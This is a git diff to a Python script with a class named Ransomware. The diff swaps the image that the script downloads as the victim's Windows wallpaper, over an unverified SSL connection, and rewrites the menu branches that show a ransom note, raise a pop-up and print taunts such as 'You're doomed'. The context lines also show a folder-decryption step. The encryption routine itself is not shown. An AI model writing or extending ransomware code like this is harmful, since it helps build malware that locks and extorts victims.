@@ -85,7 +85,7 @@ class Ransomware:
 
  # Change Background
 def change_background(self):
-    image_url = "https://www.unigamesity.com/wp-content/uploads/2009/05/you-have-been-selfed.jpg"
+    image_url = "https://i.imgflip.com/2swaf4.jpg"
     path = "C:/Windows/Web/wallpaper.jpg"
     context = ssl._create_unverified_context()
     with urllib.request.urlopen(image_url, context=context) as u, open(path, 'wb') as f:
@@ -152,13 +152,13 @@ while True:
         folder_path = input("Please type the folder path you'd like to decrypt: ")
         decrypt_folder(folder_path, key)
 
-    elif user_input.lower() == "Pop-Up":
+    elif method == "Pop-Up":
     # windows pop-up
         ransomware.ransom_note()
         ransomware.popup()
         print("You're doomed")
 
-    elif user_input.lower() == "Background":
+    elif method == "Background":
         #windows background change
         ransomware.change_background()
         print("Gotcha!")
@@ -168,3 +168,5 @@ while True:
 
     else:
         print("Invalid choice. Please try again.")
+
+# END
